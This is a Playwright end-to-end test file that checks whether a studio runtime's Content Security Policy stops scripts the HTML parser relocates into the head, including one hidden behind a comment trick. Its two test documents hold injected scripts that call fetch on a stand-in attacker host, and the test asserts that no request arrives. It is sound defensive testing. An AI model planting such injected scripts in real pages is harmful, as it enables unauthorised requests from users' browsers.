import { spawn } from 'node:child_process'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { expect, type Page, test } from '@playwright/test'

const inlineScript = fileURLToPath(
  new URL('../../studio-runtime/runtime/inline-preview.mjs', import.meta.url),
)

async function buildRuntimePreview(
  source: string,
): Promise<{ html: string; cleanup: () => Promise<void> }> {
  const root = await mkdtemp(join(tmpdir(), 'sz-runtime-csp-e2e-'))
  await mkdir(join(root, 'dist'), { recursive: true })
  await writeFile(join(root, 'dist', 'index.html'), source)
  await new Promise<void>((resolve, reject) => {
    const child = spawn(process.execPath, [inlineScript], { cwd: root, stdio: 'pipe' })
    let stderr = ''
    child.stderr.on('data', (chunk) => {
      stderr += String(chunk)
    })
    child.on('error', reject)
    child.on('exit', (code) =>
      code === 0 ? resolve() : reject(new Error(`inline-preview saiu com ${code}: ${stderr}`)),
    )
  })
  return {
    html: await readFile(join(root, 'preview.html'), 'utf8'),
    cleanup: () => rm(root, { recursive: true, force: true }),
  }
}

async function mountSrcDoc(page: Page, html: string): Promise<void> {
  await page.evaluate((srcdoc) => {
    const frame = document.createElement('iframe')
    frame.dataset.testid = 'runtime-preview'
    frame.setAttribute('sandbox', 'allow-scripts')
    frame.srcdoc = srcdoc
    document.body.appendChild(frame)
  }, html)
}

test('runtime Pro aplica a CSP antes de scripts deslocados para o head pelo parser', async ({
  page,
}) => {
  let requests = 0
  await page.route('https://evil.test/**', async (route) => {
    requests++
    await route.fulfill({ status: 204 })
  })
  await page.goto('/')

  for (const document of [
    '<!doctype html><script>fetch("https://evil.test/antes")</script><html><head></head><body></body></html>',
    '<!doctype html><!-- <head> --><html><head><script>fetch("https://evil.test/comentario")</script></head><body></body></html>',
  ]) {
    const preview = await buildRuntimePreview(document)
    try {
      await mountSrcDoc(page, preview.html)
      await page.waitForTimeout(300)
      expect(requests).toBe(0)
      await page
        .locator('iframe[data-testid="runtime-preview"]')
        .last()
        .evaluate((element) => element.remove())
    } finally {
      await preview.cleanup()
    }
  }
})
